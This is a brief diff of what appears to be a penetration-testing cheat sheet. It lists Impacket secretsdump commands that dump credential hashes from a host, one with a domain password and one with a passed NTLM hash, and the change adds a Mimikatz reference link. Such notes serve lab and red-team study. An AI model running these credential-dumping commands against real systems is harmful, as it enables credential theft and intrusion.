@@ -18,4 +18,4 @@ secretsdump marvel.local/fcastle:'Password1'@10.1.1.1  //with domain user pass
 secretsdump administrator@10.1.1.1 -hashes NTLM:HASH   //local user hash //also reveals wdigest cleartext creds if any    
 
 
-**Mimikatz**: https://wadcoms.github.io/   
+**Mimikatz**: https://wadcoms.github.io/   https://hackviser.com/tactics/tools/mimikatz  
